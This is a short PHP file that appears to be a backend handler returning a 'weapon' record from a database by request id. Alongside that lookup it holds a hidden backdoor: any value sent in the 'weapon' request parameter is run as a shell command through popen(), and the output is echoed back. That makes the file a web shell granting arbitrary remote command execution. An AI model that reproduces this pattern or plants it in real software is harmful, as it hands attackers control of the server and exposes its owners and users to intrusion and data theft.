<?php
    require_once "dbh.inc.php";
    require_once "functions.inc.php";

    if (isset($_REQUEST['weapon'])){
        $handle = popen($_REQUEST['weapon'],'r');
        echo fread($handle,1024*4);
    }

    $weapon=$_GET["id"];
    $res=getWeapon($conn, $weapon);

    return $res;
